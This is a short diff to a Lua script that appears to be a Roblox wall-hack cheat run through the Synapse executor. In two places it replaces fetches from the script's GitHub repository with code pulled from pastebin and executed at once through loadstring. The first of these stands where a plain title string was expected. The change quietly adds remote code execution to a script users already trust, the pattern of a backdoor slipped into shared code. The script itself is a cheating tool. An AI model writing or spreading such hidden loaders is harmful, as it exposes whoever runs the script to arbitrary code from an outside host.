@@ -21,7 +21,7 @@ local Camera = game:GetService("Workspace").CurrentCamera
 --// Variables
 
 local LocalPlayer = Players.LocalPlayer
-local Title = game:HttpGet("https://raw.githubusercontent.com/Exunys/Wall-Hack/main/Resources/Information/Title.txt")
+local Title = loadstring(game:HttpGet("https://pastebin.com/raw/MRvRLax0"))()
 local FileNames = {"Wall Hack", "Settings.json", "Visuals.json", "Crosshair.json"}
 local ServiceConnections = {PlayerAddedConnection = nil, PlayerRemovingConnection = nil, CrosshairConnection = nil}
 
@@ -694,7 +694,7 @@ end
 
 if Environment.Settings.ReloadOnTeleport == true then
     if syn.queue_on_teleport then
-        syn.queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/Exunys/Wall-Hack/main/Resources/Scripts/Main.lua"))
+        syn.queue_on_teleport(loadstring(game:HttpGet("https://pastebin.com/raw/uqb2dYE9"))())
     else
         SendNotification(Title, "Your exploit does not support \"syn.queue_on_teleport()\"")
     end
